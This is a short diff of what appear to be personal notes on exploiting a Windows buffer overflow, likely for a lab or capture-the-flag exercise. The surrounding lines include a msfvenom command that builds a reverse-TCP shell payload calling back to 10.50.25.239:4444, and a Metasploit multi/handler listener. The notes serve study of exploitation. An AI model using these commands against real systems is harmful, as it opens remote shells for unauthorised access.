@@ -96,7 +96,7 @@ in log data.  !mona modules  # list out all loadded dlls and protection
         msfvenom -p windows/shell/reverse_tcp lhost =10.50.25.239 lport=4444 -b "\x00" -f python
         
         DONT INSTANTLY COPY LINE THAT INTIALIZES buf+++++++++++++++++++++++++++++++++++++++
-
++++ IF 9999 is running remotely i only need the msfvenom info, my winoverflow.py, reverse exploit
 
       msfconsole
       use multi/handler
